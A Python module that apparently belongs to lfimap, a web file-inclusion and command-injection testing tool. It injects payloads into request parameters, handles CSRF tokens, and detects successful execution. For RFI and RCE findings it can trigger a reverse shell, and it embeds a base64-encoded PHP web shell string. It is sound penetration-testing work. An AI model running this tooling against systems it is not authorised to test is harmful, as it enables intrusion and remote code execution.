"""Request"""
import socket
import time
import urllib.parse as urlparse
from urllib.parse import urlparse, parse_qs

import requests
import requests.exceptions
import urllib3
from bs4 import BeautifulSoup

from src.utils.arguments import init_args
from src.utils.encodings import encode
from src.utils.stats import stats
from src.configs import config
from src.utils.colors import Colors
from src.utils.cleanup import lfimap_cleanup

def extract_all_parameters(url, form_data=""):
    """Extract parameters from the URL"""
    parsed_url = urlparse(url)
    url_parameters = parse_qs(parsed_url.query)

    # Convert the values from a list to a single value (if applicable)
    cleaned_url_parameters = {
        key: value[0] if len(value) == 1 else value
        for key, value in url_parameters.items()
    }

    # Extract parameters from the form data
    if form_data != "":
        form_parameters = parse_qs(form_data)

    # Convert the values from a list to a single value (if applicable)
    cleaned_form_parameters = {
        key: value[0] if len(value) == 1 else value
        for key, value in form_parameters.items()
    }

    # Merge the URL parameters and form parameters into a single dictionary
    all_parameters = {**cleaned_url_parameters, **cleaned_form_parameters}

    return all_parameters


def extract_input_fields(html_content):
    """Extract Input Fields"""
    input_fields = {}

    soup = BeautifulSoup(html_content, "html.parser")
    for input_tag in soup.find_all("input"):
        input_name = input_tag.get("name")
        input_value = input_tag.get("value")

        if input_name is not None:
            input_fields[input_name] = input_value

    return input_fields


def addToExploits(
    req, request_type, exploit_type, getVal, postVal, headers, attackType, os
):
    """Add to Exploits"""
    e = {}
    e["REQUEST_TYPE"] = request_type
    e["EXPLOIT_TYPE"] = exploit_type
    e["GETVAL"] = getVal
    e["POSTVAL"] = postVal
    e["HEADERS"] = req.headers
    e["ATTACK_METHOD"] = attackType
    e["OS"] = os
    config.exploits.append(e)
    return e


def init(
    req, reqType, explType, getVal, postVal, headers, attackType, cmdInjectable=False
):
    """Init the list of exploits"""
    # if(config.scriptName != ""):
    config.TO_REPLACE.append(config.scriptName)
    config.TO_REPLACE.append(config.scriptName + ".php")
    config.TO_REPLACE.append(config.scriptName + "%00")

    args  = init_args()
    
    if checkPayload(req) or cmdInjectable:
        for _, to_replace in enumerate(config.TO_REPLACE):
            if postVal and isinstance(postVal, bytes):
                postVal = postVal.decode("utf-8")

            if (
                getVal.find(to_replace) != -1
                or getVal.find("?c=" + to_replace) != -1
                or postVal.find(to_replace) != -1
            ):
                # Determine the os based on the payload that worked
                # TODO improve this to reduce false positives.
                if (
                    "ipconfig" in getVal.lower()
                    or "Windows IP Configuration" in getVal.lower()
                ):
                    os = "windows"
                else:
                    os = "linux"

                u = getVal.replace(to_replace, config.tempArg)

                if postVal.find(to_replace):
                    p = postVal.replace(to_replace, config.tempArg)
                    # Determine the os based on the payload that worked
                    # TODO improve this to reduce false positives.
                    if (
                        "ipconfig" in postVal.lower()
                        or "Windows IP Configuration" in postVal.lower()
                    ):
                        os = "windows"
                    else:
                        os = "linux"

                else:
                    p = ""

                exploit = addToExploits(
                    req, reqType, explType, u, p, headers, attackType, os
                )

                # Print finding
                if postVal == "" and explType:
                    print(Colors().green("[+]") + " " + explType + " -> '" + getVal + "'", flush = True)
                    stats["vulns"] += 1
                elif explType:
                    print(
                        Colors().green("[+]")
                        + " "
                        + explType
                        + " -> '"
                        + getVal
                        + "' -> HTTP POST -> '"
                        + postVal
                        + "'",
                        flush = True
                    )
                    stats["vulns"] += 1

                if args['revshell'] and (explType == "RFI" or explType == "RCE" or attackType == "TRUNC"):
                    pwn(exploit)

                if not args['no_stop']:
                    return True

                return False

    return False


def checkPayload(webResponse):
    """
    Checks if sent payload is executed, if any of the below keywords are in the response, returns True
    """
    for word in config.KEY_WORDS:
        if webResponse:
            if word in webResponse.text:
                if (
                    word == "PD9w"
                    and "PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K" in webResponse.text
                ):
                    return False
                return True
    return False


def prepareRequest(parameter, payload, url, postData):
    """
    Prepare a request to be sent
    """

    args  = init_args()
    if parameter in url:
        reqUrl = url.replace(parameter, encode(payload))
    else:
        reqUrl = url

    # if postData and args['json'] and not is_valid_json(args['json']):
    #    reqData = convert_http_formdata_to_json(postData.replace(parameter, encode(payload)).lstrip())
    if postData:
        reqData = postData.replace(parameter, encode(payload)).lstrip()
    elif postData:
        reqData = postData.replace(parameter, encode(payload)).lstrip()
    else:
        reqData = ""

    reqHeaders = {}
    if parameter in args['httpheaders'].values():
        for key, value in args['httpheaders'].items():
            if parameter in value:
                reqHeaders[key.strip()] = value.replace(
                    parameter, encode(payload)
                ).encode("utf-8")
            else:
                reqHeaders[key] = value

    else:
        return reqUrl, args['httpheaders'], reqData
    return reqUrl, reqHeaders, reqData


def REQUEST(
    url,
    headersData,
    postData,
    proxy,
    exploitType,
    exploitMethod,
    exploit=False,
    followRedirect=True,
    isCsrfRequest=False,
):
    """Send out a request"""
    args  = init_args()
    doContinue = True
    res = None
    if not postData:
        postData = ""
    try:
        stats["requests"] += 1
        # Set the timeout on the testing request, based on proxy and user-provided value
        if exploitMethod == "RFI":
            timeout = 15
        elif args['maxTimeout']:
            timeout = args['maxTimeout']
        elif args['proxyAddr']:
            timeout = 15
        else:
            timeout = 5

        # Handle if CSRF request
        if isCsrfRequest:
            if args['csrfMethod'] and isCsrfRequest:
                method = args['csrfMethod']
        elif args['method']:
            method = args['method']
        else:
            method = "GET"

        if args['csrfUrl'] and isCsrfRequest:
            url = args['csrfUrl']

        if args['csrfData'] and isCsrfRequest:
            postData = args['csrfData']

        # Handle CSRF refresh before sending the payload.
        if args['updateCsrfToken']:
            if args['previouscsrf']:
                r = args['previousres']
                input_fields = extract_input_fields(r.text)
                parameters = extract_all_parameters(config.url, config.postreq)
            else:
                # CSRF token request.
                # csrf_r,_ = REQUEST(args['csrfUrl'], headers, args['csrfData'], config.proxies, "test", "test", exploit = False, followRedirect = True, isCsrfRequest = True)
                r = requests.request(
                    method,
                    url,
                    data=postData,
                    headers=headersData,
                    proxies=proxy,
                    verify=False,
                    timeout=timeout,
                    allow_redirects=True,
                )
                input_fields = extract_input_fields(r.text)
                parameters = extract_all_parameters(config.url, config.postreq)

            if input_fields and parameters:
                if args['csrfParameter'] and args['csrfParameter'] in url:
                    # Modify get data.
                    # Get current csrf value from the request that user specified
                    curr_csrf = parameters[args['csrfParameter']]
                    new_csrf = input_fields[args['csrfParameter']]
                    url = url.replace(curr_csrf, new_csrf)

                if isinstance(postData, bytes):
                    postData = postData.decode("latin-1", errors="replace")

                if args['csrfParameter'] and args['csrfParameter'] in postData:
                    curr_csrf = parameters[args['csrfParameter']]
                    new_csrf = input_fields[args['csrfParameter']]
                    postData = postData.replace(curr_csrf, new_csrf)

        else:
            # This res object will be used to check if the payload sent worked and if the parameter is actually vulnerable
            # Send actual payload
            if exploitMethod == "test" or exploitMethod == "RFI":
                res = requests.request(
                    method,
                    url,
                    data=postData,
                    headers=headersData,
                    proxies=proxy,
                    verify=False,
                    timeout=timeout,
                    allow_redirects=followRedirect,
                )
            else:
                res = requests.request(
                    method,
                    url,
                    data=postData,
                    headers=headersData,
                    proxies=proxy,
                    verify=False,
                    allow_redirects=followRedirect,
                    timeout=args['maxTimeout']
                )

            # Check if CSRF token is returned in the response, prepare it for the next request
            if args['updateCsrfToken']:
                input_fields = extract_input_fields(res.text)
                if (
                    args['csrfParameter']
                    and args['csrfParameter'] in input_fields
                    and input_fields[args['csrfParameter']]
                ):
                    args['previouscsrf'] = input_fields[args['csrfParameter']]
                else:
                    args['previouscsrf'] = False

                if res:
                    args['previousres'] = res

            # If the second order check url is specified, res will be overwritten with new value of that second order endpoint.
            # If the request is csrf token refresh, skip the second order check.
            if args['checkUrl'] and not isCsrfRequest:
                if args['secondMethod']:
                    res = requests.request(
                        args['secondMethod'],
                        args['checkUrl'],
                        data=args['secondData'],
                        headers=headersData,
                        proxies=proxy,
                        verify=False,
                        allow_redirects=True,
                        timeout=args['maxTimeout']
                    )
                else:
                    res = requests.get(
                        args['checkUrl'],
                        data=args['secondData'],
                        headers=headersData,
                        proxies=proxy,
                        verify=False,
                        allow_redirects=True,
                        timeout=args['maxTimeout']
                    )

        # TODO exploitMethod and exploitType are not being used
        if not exploit:
            if init(res, "", exploitType, url, postData, headersData, exploitMethod):
                doContinue = False

        if args['log']:
            with open(args['log'], "a+", encoding="latin1") as fp:

                # Log request
                splitted = url.split("/")
                fp.write(
                    res.request.method
                    + " "
                    + url.replace(
                        "".join(splitted[0] + "/" + splitted[1] + "/" + splitted[2]), ""
                    )
                    + " HTTP/1.1\n"
                )
                fp.write("Host: " + splitted[2] + "\n")
                for k, v in res.request.headers.items():
                    if not (isinstance(k, str)):
                        k = k.decode("utf-8")
                    if not (isinstance(v, str)):
                        v = v.decode("utf-8")
                    fp.write(k + ": " + v + "\n")

                if res.request.body:
                    fp.write("\n" * 2)
                    fp.write(res.request.body.decode("utf-8"))
                fp.write("\n" * 3)

                # Log response
                protocol = "HTTP/1.1"

                fp.write(
                    protocol + " " + str(res.status_code) + " " + res.reason + "\n"
                )
                for k, v in res.headers.items():
                    if not (isinstance(k, str)):
                        k = k.decode("utf-8")
                    if not (isinstance(v, str)):
                        v = v.decode("utf-8")
                    fp.write(k + ": " + v + "\n")
                fp.write("\n\n")
                fp.write(res.text + "\n")
                fp.write("--\n\n\n")

        if args['delay']:
            time.sleep(args['delay'] / 1000)

    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...", flush = True)
        lfimap_cleanup(config.webDir, stats)
    except requests.exceptions.InvalidSchema:
        if not args['no_stop']:
            print(
                Colors().red("[-]")
                + " Previous request caused InvalidSchema exception. Try specifying '--no-stop' to continue testing even if errors occurred...",
                flush = True
            )
        else:
            print(
                Colors().red("[-]")
                + " InvalidSchema exception detected. Server cannot parse the parameter URI. Try proxying requests to see exactly what happened...",
                flush = True
            )
        return False, False
    except requests.exceptions.ConnectionError:
        if not args['no_stop']:
            print(
                Colors().red("[-]")
                + " Previous request caused ConnectionError. Try specifying '--no-stop' to continue testing even if errors occurred...",
                flush = True
            )
        else:
            print(
                Colors().red("[-]")
                + " Previous request caused ConnectionError. Try proxying requests to see exactly what happened...",
                flush = True
            )
        return False, False
    except socket.timeout:
        if exploitMethod == "RFI" and not args['callback'] and not args['lhost']:
            print(
                Colors().green("[?]")
                + " Socket timeout. This could be an indication for RFI vulnerability. Try specifying '--lhost' or '--callback' to confirm...",
                flush = True
            )
        if not args['no_stop']:
            print(
                Colors().red("[-]")
                + " Previous request caused Socket timeout. Try specifying '--no-stop' to continue testing even if errors occurred...",
                flush = True
            )
        else:
            print(
                Colors().red("[-]")
                + " Previous request caused socket timeout. Try specifying bigger '--delay' or '--max-timeout'. Skipping...",
                flush = True
            )
        return False, False
    except requests.exceptions.ReadTimeout:
        if exploitMethod == "RFI" and not args['callback'] and not args['lhost']:
            print(
                Colors().green("[?]")
                + " Previous request caused ReadTimeout exception. This could be an indication for RFI vulnerability. Try specifying '--lhost' or '--callback' to confirm.",
                flush = True
            )
        else:
            print(
                Colors().red("[-]")
                + " Previous request caused read timeout. Try specifying bigger '--delay' or '--max-timeout'. Skipping...",
                flush = True
            )
        return False, False
    except urllib3.exceptions.ReadTimeoutError:
        if exploitMethod == "RFI" and not args['callback'] and not args['lhost']:
            print(
                Colors().green("[?]")
                + " Previous request caused ReadTimeoutError. This could be an indication for RFI vulnerability. Try specifying '--lhost' or '--callback' to confirm.",
                flush = True
            )
        else:
            print(
                Colors().red("[-]")
                + " Previous request caused ReadTimeoutError. Try specifying bigger '--delay' or '--max-timeout'. Skipping...",
                flush = True
            )
        return False, False
    except ConnectionRefusedError:
        if not args['no_stop']:
            print(
                Colors().red("[-]")
                + " Previous request caused ConnectionRefusedError. Try specifying '--no-stop' to continue testing upon errors...",
                flush = True
            )
        else:
            print(
                Colors().red("[-]")
                + " Previous request caused ConnectionRefusedError. Try proxying requests to see exactly what happened...",
                flush = True
            )
        return False, False
    except:
        if args['verbose']:
            print(
                Colors().red("[-]")
                + " Previous request caused uncaught exception. Try proxying requests to see exactly what happened",
                flush = True
            )
            raise
        return False, False

    return res, doContinue
